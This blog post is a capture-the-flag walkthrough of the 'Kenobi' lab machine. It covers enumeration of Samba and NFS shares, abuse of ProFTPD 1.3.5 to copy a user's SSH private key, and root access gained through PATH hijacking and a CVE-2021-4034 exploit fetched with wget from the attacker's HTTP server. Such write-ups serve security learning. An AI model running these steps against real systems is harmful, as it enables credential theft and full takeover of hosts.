---
layout: post
title:  "Kenobi"
categories: blog
layout: post
---

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

<!--more-->

## Scanning

First we will deploy the machine and scan the target using rustscan.

<img src="images/03.Kenobi/01.png" height="600">

<img src="images/03.Kenobi/02.png">

<img src="images/03.Kenobi/03.png">

<img src="images/03.Kenobi/04.png">

## Enumeration

We can see that there is Samba file server running, so let's find the available shares.

```
smbclient -L 10.10.74.95
```

<img src="images/03.Kenobi/05.png" height="400">

We will now connect to the anonymous share.

```
smbclient \\\\10.10.74.95\\anonymous
```

<img src="images/03.Kenobi/06.png" height="300">

When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.

<img src="images/03.Kenobi/07.png" height="700">

On the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let's enumerate for nfs shares and from the mount information we can see the mount /var.

```
nmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount10.10.74.95
```

<img src="images/03.Kenobi/08.png" height="700">

We saw there is a ftp service running on port 21. Let's try to grab the banner of ftp to find the ftp version using netcat.

```
nc 10.10.74.95 21
```

<img src="images/03.Kenobi/09.png">

We will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.

```
searchsploit proftpd 1.3.5
```

While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.

<img src="images/03.Kenobi/10.png">

## Exploitation

Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.

Let's connect to ftp and copy the files.

```
nc 10.10.74.95 21
```

```
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```
SITE CPTO /var/tmp/id_rsa
```

<img src="images/03.Kenobi/11-1.png">

<img src="images/03.Kenobi/11.png" height="300">

Now we will mount the /var directory to our machine.

```
mkdir /mnt/kenobi
```

```
mount 10.10.74.95:/var /mnt/kenobi
```

```
cd /mnt/kenobi
```

<img src="images/03.Kenobi/12.png" height="700">

We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.

```
chmod 600 id_rsa
```
```
ssh kenobi@10.10.74.95 -i id rsa
```

<img src="images/03.Kenobi/13.png" height="700">

We're logged in as kenobi and we can read the user flag.

<img src="images/03.Kenobi/14.png" height="200">

## Privilege Escalation

### Approach 1

We will find the files with SUID bit set.

```
find / -perm -u=s - type f 2>/dev/null
```

<img src="images/03.Kenobi/15.png" height="500">

/usr/bin/menu seems to be unusual among the list of file that we got.

When we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.

<img src="images/03.Kenobi/16.png" height="300">

When we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.

<img src="images/03.Kenobi/17.png" height="400">

We got the root shell!!!

### Approach 2

Start the python http server and download linpeas.sh to the target machine.

```
python -m http.server 1111
```
<img src="images/03.Kenobi/18.png" height="200">

> On target machine

```
wet http: //10.6.29.149:1111/linpeas.sh
```

Change the file permissions to executable and run the file.

```
chmod +x linpeas.sh
```
```
./linpeas.sh
```

<img src="images/03.Kenobi/19.png" height="700">

We can see that the target machine is vulnerable to CVE-2021-4034.

<img src="images/03.Kenobi/20.png">

Clone the repo into your machine.

```
https://github.com/ryaagard/CVE-2021-4034.git
```

```
cd CVE-2021-4034
```

Start the python server again to server the files.

```
python -m http.server 1111
```

On target machine create a folder and download all the files to the machine.

```
wet http://10.6.29.149:1111/evil.so
```

```
wget http://10.6.29.149:1111/evil-so.c
```

```
wget http://10.6.29.149:1111/exploit.c
```

```
wget http://10.6.29.149:1111/Makefile
```

```
wget http://10.6.29.149:1111/README.md
```

<img src="images/03.Kenobi/21.png" height="700">

Run the make file.

```
make
```

Execute exploit.sh.

```
./exploit.sh
```

<img src="images/03.Kenobi/22.png" height="700">

We got the root shell!!!
